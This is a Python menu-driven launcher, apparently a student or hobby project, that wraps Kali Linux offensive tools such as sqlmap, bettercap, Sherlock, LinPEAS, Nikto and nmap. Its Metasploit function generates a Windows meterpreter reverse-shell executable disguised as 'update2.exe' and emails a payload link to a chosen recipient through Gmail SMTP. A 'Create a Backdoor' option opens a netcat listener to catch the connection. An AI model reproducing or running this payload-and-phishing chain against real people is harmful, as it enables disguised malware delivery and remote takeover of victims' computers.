import subprocess
import os
import time
import socket
import smtplib
from colorama import init, Fore, Style

init(autoreset=True)                                                                 # Initialize colorama to automatically reset colors after each use

def generate_bash_script(LHOST):
    # Define the content of the bash script
    bash_content = f"""#!/bin/bash

    sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST={LHOST} LPORT=4444 -o update2.exe
"""

    # Write the content to the file
    with open("generate_payload.sh", 'w') as f:
        f.write(bash_content)

    if __name__ == "__main__":
        

        # Generate bash script with the provided LHOST
    
        
        print("Bash script 'generate_payload.sh' has been created.")

def pspy(commands7):
    """
    Runs the given commands in a new terminal window on Kali Linux.

    Args:
        commands (list): A list of commands to be executed.
    """

    try:
        # Join the commands with '; ' to execute them in sequence
        command_str = '; '.join(commands7)

        # Open a new terminal window and execute the commands
        process = subprocess.Popen(['x-terminal-emulator', '-e', f'bash -c "{command_str};echo Press Enter to close the window; read"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(30)
        # Wait for the process to terminate
        process.wait()

        print("Commands executed in a new terminal window.")
    except subprocess.CalledProcessError as e:
        print(f"Error running commands: {e}")

# Example usage
commands7 = ["sudo pspy --debug"]


def install_sqlmap():
    try:
        subprocess.run(["sudo", "apt", "update"], check=True)                        # Execute shell commands to update and install SQLMap
        subprocess.run(["sudo", "apt", "install", "-y", "sqlmap"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error installing SQLMap:", e)                                         # Handle any errors

def run_sqlmap(url):
    try:
        subprocess.run(["sqlmap", "-u", url], check=True)                            # Execute SQLMap command using subprocess
    except FileNotFoundError:
        print("SQLMap is not installed. Installing...")
        install_sqlmap()
        print("SQLMap installed successfully. Running...")
        run_sqlmap(url)
    except subprocess.CalledProcessError as e:
        # Handle any errors
        print("Error running SQLMap:", e)




def theHarvester():
    cm01 = ["python3", "theHarvester.py"]
    command = str(input("Please enter the specifications you want: "))
    print("\n\n\n")
    cm02 = list(command.split(" "))
    cm03 = cm01 + cm02
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/theHarvester"))
    subprocess.call(cm03 , cwd=dpath)




def bettercap(commands):
    try:
        command_str = '; '.join(commands)                                           # Join the commands with '; ' to execute them in sequence

        # Open a new terminal window and execute the commands
        process = subprocess.Popen(['x-terminal-emulator', '-e', f'bash -c "{command_str};echo Press Enter to close the window; read"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(30)
        process.wait()
        print("Commands executed in a new terminal window.")                        # Wait for the process to terminate

    except subprocess.CalledProcessError as e:
        print(f"Error running commands: {e}")

commands = ["sudo bettercap"]




def Impacket():
    cm01 = ["smbclient"]
    command = str(input("Please enter the specifications you want: "))
    print("\n\n\n")
    cm02 = list(command.split(" "))
    cm03 = cm01 + cm02
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/impacket"))
    subprocess.call(cm03 , cwd=dpath)




def install_dirb():
    try:
        subprocess.run(["bash", "install_dirb.sh"], check=True)                    # Execute shell script to install Dirb

    except subprocess.CalledProcessError as e:
        print("Error installing Dirb:", e)                                         # Handle any errors

def run_dirb():
    try:
        url = input("Enter the URL to scan with Dirb: ")                           # Prompt the user for the URL
        subprocess.run(["dirb", url], check=True)                                  # Execute Dirb command using subprocess

    except FileNotFoundError:
        print("Dirb is not installed. Installing...")
        install_dirb()
        print("Dirb installed successfully. Running...")
        run_dirb()
    except Exception as e:
        print("Error running Dirb:", e)                                            # Handle any other errors




def Sherlock():
    uname = str(input("Please enter the username you want to search: \n\n\n"))
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/sherlock/sherlock"))
    subprocess.call(["python3", "sherlock.py", uname], cwd= dpath)




def LinPEAS():
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF"))
    subprocess.call(["./linpeas.sh"], cwd= dpath)




def LinEnum():
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/LinEnum"))
    subprocess.call(["./LinEnum.sh"], cwd= dpath)




def Nikto():
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/nikto/program"))
    cm01 = ["./nikto.pl","-h"]
    command = str(input("Please enter the specifications you want: "))
    print("\n\n\n")
    cm02 = list(command.split(" "))
    cm03 = ["-o","result.txt"]
    cm04 = cm01 + cm02 + cm03
    subprocess.call(cm04, cwd=dpath)



def LSE():
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/linux-smart-enumeration"))
    subprocess.call(["./lse.sh"], cwd= dpath)




def LinuxES():
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/linux-exploit-suggester"))
    subprocess.call(["./linux-exploit-suggester.sh"], cwd= dpath)



    
def PVCheck():
    ipupc=input("Enter IP Address of Machine you wish to target: ")
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF"))
    subprocess.call(["./unix-privesc-check.sh","standard",ipupc], cwd= dpath)

def Metasploit():
     LHOST = input("Enter the LHOST IP address: ")
     generate_bash_script(LHOST)
     dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF"))
     cm01=["chmod","+x","generate_payload.sh"]
     subprocess.call(cm01, cwd=dpath)
     cm02=["./generate_payload.sh"]
     subprocess.call(cm02, cwd=dpath)


     my_email = input("Please enter the email: ")
     password = input("Please enter the password ")
     connection = smtplib.SMTP("smtp.gmail.com",587)
     connection.starttls()
     connection.login(user=my_email , password= password)
     message =input("Please enter the payload link ")
     print(message)
     email_input = input("Please enter the email you want to send this to: ")
     connection.sendmail(from_addr=my_email, to_addrs= email_input,msg=f"Subject:{input}\n\n {message}")#test it by putting your mail
     print("mail sent")
     command="x-terminal-emulator"
     subprocess.Popen(command)




def hping3(commands3):
    try:
        command_str = '; '.join(commands3)
        process = subprocess.Popen(['x-terminal-emulator', '-e', f'bash -c "{command_str};echo Press Enter to close the window; read"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(30)
        process.wait()
        print("Commands executed in a new terminal window.")

    except subprocess.CalledProcessError as e:
        print(f"Error running commands: {e}")

commands3 = ["sudo hping3"]




def Nmap():
    cm01 = ["nmap"]
    command = str(input("Please enter the specifications you want: "))
    print("\n\n\n")
    cm02 = list(command.split(" "))
    cm03 = cm01 + cm02
    subprocess.call(cm03)




def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                            # Create a socket object

    try:
        s.connect(('8.8.8.8', 80))                                                  # Connect to a remote server (doesn't have to be reachable)
        ip_address = s.getsockname()[0]                                             # Get the local IP address
    except Exception as e:
        print("Error:", e)
        ip_address = "Unable to retrieve IP address"
    finally:
        s.close()                                                                   # Close the socket

    return ip_address


ip_address = get_ip_address()                                                       # Get the IP address
print("Your IP address is:", ip_address)

def netcat(commands5):
    try:
        command_str = '; '.join(commands5)                                          # Join the commands with '; ' to execute them in sequence

        # Open a new terminal window and execute the commands
        process = subprocess.Popen(['x-terminal-emulator', '-e', f'bash -c "{command_str};echo Press Enter to close the window; read"'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(30)
        process.wait()                                                              # Wait for the process to terminate
        print("Commands executed in a new terminal window.")

    except subprocess.CalledProcessError as e:
        print(f"Error running commands: {e}")

commands5 = ["sudo nc -lvnp 87 -s " + ip_address]


def Dirsearch():
    cm01 = ["python3", "dirsearch.py"]
    command = str(input("Please enter the specifications you want: "))
    print("\n\n\n")
    cm02 = list(command.split(" "))
    cm03 = cm01 + cm02
    dpath = str(os.path.join(os.path.expanduser("~"), "Downloads/Project-LEAF/dirsearch"))
    subprocess.call(cm03 , cwd=dpath)



def print_menu():
    bright_red = Fore.LIGHTRED_EX
    bright_yellow = Fore.LIGHTYELLOW_EX
    bright_cyan = Fore.LIGHTCYAN_EX  # Use a brighter shade of cyan

    print(bright_cyan + Style.BRIGHT + "+" + "-"*50 + "+")
    print("|{:^50}|".format(bright_yellow + Style.BRIGHT + "MENU"))
    print("+" + "-"*50 + "+")
    menu_items = [
        (" 1.",  "SQL Injection"),
        (" 2.",  "OSINT"),
        (" 3.",  "Network Sniffing"),
        (" 4.",  "Network Protocol Manipulation"),
        (" 5.",  "Web Directory Sniffer"),
        (" 6.",  "Online Account Finder"),
        (" 7.",  "Privesc Check"),
        (" 8.",  "Web Scanning"),
        (" 9.",  "Device Enumeration"),
        ("10.",  "Vulnerablility Identification"),
        ("11.",  "Privilege Escalation Path Finder"),
        ("12.",  "Remote Access"),
        ("13.",  "Network Testing"),
        ("14.",  "Network/Port Scanning"),
        ("15.",  "Create a Backdoor"),
        ("16.",  "Find Hidden Web Directories"),
        ("17.",  "Process Monitoring"),
        ("18.",  "Exit")
    ]
    for item in menu_items:
        print("| {:<2} | {:<43} |".format(bright_yellow + item[0], item[1]))
    print("+" + "-"*50 + Style.RESET_ALL)  # Reset style after printing

def main_menu():
    while True:
        print_menu()
        try:
            choice = int(input(Fore.CYAN + "Please enter the number of the activity you wish to perform: "))
        except ValueError:
            print(Fore.RED + "Invalid input. Please enter a valid number.")
            continue

        if 1 <= choice <= 19:
            if choice == 1:
                url = input("Enter the URL to be scanned with SQLMap: ")
                print(Fore.CYAN + "Running SQLMap...")
                run_sqlmap(url)

            elif choice == 2:
                    print(Fore.CYAN + "Running theHarvester...")
                    theHarvester()

            elif choice == 3:
                print(Fore.CYAN + "Running Bettercap...")
                bettercap(commands)

            elif choice == 4:
                print(Fore.CYAN + "Running Impacket...")
                cm01 = ["smbclient"]
                Impacket()

            elif choice == 5:
                print(Fore.CYAN + "Running Dirb...")
                run_dirb()


            elif choice == 6:
                print(Fore.CYAN + "Running Sherlock...")
                Sherlock()

            elif choice == 7:
                print(Fore.CYAN + "Running ... Please choose from the following tools: ")
                print(Fore.CYAN + "Choose from the following tools")
                print("1. LinEnum (Basic)")
                print("2. LinPEAS (Advanced)")
                tool_choice = input(Fore.CYAN + "Enter the tool number:")

                if tool_choice == '1':
                    print(Fore.CYAN + "Running LinEnum...")
                    LinEnum()

                elif tool_choice == '2':
                  print(Fore.CYAN + "Running LinPEAS...")
                  LinPEAS()

            elif choice == 8:
                print(Fore.CYAN + "Running Nikto...")
                Nikto()

            elif choice == 9:
                print(Fore.CYAN + "Running Linux Smart Enumeration...")
                LSE()

            elif choice == 10:
                print(Fore.CYAN + "Running Linux Exploit Suggester...")
                LinuxES()

            elif choice == 11:
                print(Fore.CYAN + "Running Unix Privesc Check...")
                PVCheck()

            elif choice == 12:
                print(Fore.CYAN + "Running Metasploit...")
                Metasploit()

            elif choice == 13:
                print(Fore.CYAN + "Running Hping...")
                hping3(commands3)

            elif choice == 14:
                print(Fore.CYAN + "Running Nmap...")
                Nmap()

            elif choice == 15:
                print(Fore.CYAN + "Running NetCat...")
                netcat(commands5)

            elif choice == 16:
                print(Fore.CYAN + "Running Dirsearch...")
                Dirsearch()
                
            elif choice == 17:
                print(Fore.CYAN + "Running Pspy...")
                pspy(commands7)

            elif choice == 18:
                print(Fore.GREEN + "Thank you for using our program!!")
                break
        else:
            print(Fore.RED + "Invalid input. Please enter a number between 1 and 19.")

if __name__ == "__main__":
    main_menu()
